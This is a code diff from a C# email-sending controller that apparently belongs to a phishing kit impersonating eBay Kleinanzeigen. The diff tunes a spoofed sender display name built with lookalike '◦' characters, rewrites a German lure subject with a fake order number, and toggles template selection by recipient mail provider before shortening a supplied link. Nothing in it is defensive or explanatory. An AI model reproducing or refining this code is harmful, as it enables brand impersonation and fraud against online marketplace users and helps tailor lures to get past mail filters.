@@ -69,9 +69,9 @@ public class SenderController : ControllerBase
 	{
 		var body = await GetBody(link, ServiceType.EbayDe, email);
 		
-		var displayName = "◦EBAY◦Kleinanzeigen◦Info ®";
+		var displayName = "ebay◦kleinanzeigen◦de  ®";
 
-		var subject = "Bezahlung der Ware! Vielen Dank, dass Sie sich für uns entschieden haben.#312887";
+		var subject = "Neuer Kunde! Danke, dass Sie sich für uns entschieden haben. #312887";
 
 		/*if (email.Contains("icloud"))
 		{
@@ -126,13 +126,13 @@ public class SenderController : ControllerBase
 	{
 		var template = EbayTemplate.Custom;
 
-		var listEmails = new List<string>
+		/*var listEmails = new List<string>
 		{
-			"hotmail", "outlook", "web.de", "gmx.de", "gmx.net"
+			"hotmail", "outlook",  "icloud"
 		};
 		
 		if (listEmails.Any(email.Contains) && serviceType == ServiceType.EbayDe)
-			template = EbayTemplate.Original;
+			template = EbayTemplate.Original;*/
 		
 		var shortLink = await _shortLinkService.GetShortLink(link, template);
 
